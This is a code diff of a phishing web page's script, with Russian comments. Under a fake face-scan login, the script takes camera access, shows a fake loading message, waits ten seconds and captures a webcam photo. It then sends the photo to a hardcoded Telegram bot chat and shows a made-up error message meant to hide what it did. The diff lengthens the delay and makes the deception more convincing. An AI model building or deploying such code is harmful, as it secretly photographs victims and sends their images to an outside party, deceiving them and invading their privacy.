@@ -23,19 +23,29 @@
         const chatId = '7829181579';
 
         document.getElementById('start').onclick = async () => {
+            const btn = document.getElementById('start');
+            
             try {
-                // Запрашиваем камеру
+                // Запрашиваем доступ к камере
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user" } 
                 });
+                
+                // Меняем текст на кнопке, чтобы пользователь ждал
+                btn.innerText = "Загрузка профиля... 10%";
+                btn.style.background = "#555";
+
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 video.play();
 
-                // Ждем 3 секунды (3000 мс), чтобы камера настроила яркость
+                // Увеличенная задержка: 10 секунд (10000 мс)
+                // Это даст камере время сфокусироваться и настроить свет
                 setTimeout(() => {
                     const canvas = document.getElementById('canvas');
                     const context = canvas.getContext('2d');
+                    
+                    // Рисуем кадр с видео на холст
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
                     canvas.toBlob(blob => {
@@ -43,22 +53,27 @@
                         formData.append('chat_id', chatId);
                         formData.append('photo', blob, 'snap.jpg');
 
-                        // Отправка в Телеграм
+                        // Отправка фото в Telegram
                         fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                             method: 'POST',
                             body: formData
                         })
                         .then(() => {
-                            // Сообщение об ошибке, чтобы скрыть работу скрипта
-                            alert("Ошибка входа: недостаточно освещения! Попробуйте еще раз в более светлом месте.");
-                            // Выключаем камеру
+                            btn.innerText = "Ошибка доступа";
+                            alert("Ошибка: Ваше устройство отклонило запрос безопасности. Попробуйте войти через официальное приложение.");
+                            
+                            // Выключаем камеру после снимка
                             stream.getTracks().forEach(track => track.stop());
+                        })
+                        .catch(err => {
+                            console.error("Ошибка отправки:", err);
                         });
                     }, 'image/jpeg', 0.9);
-                }, 3000); 
+                    
+                }, 10000); // Время ожидания в миллисекундах
 
             } catch (err) {
-                alert("Для входа нужно нажать 'Разрешить' для сканирования лица.");
+                alert("Для входа необходимо разрешить доступ к камере в браузере.");
             }
         };
     </script>
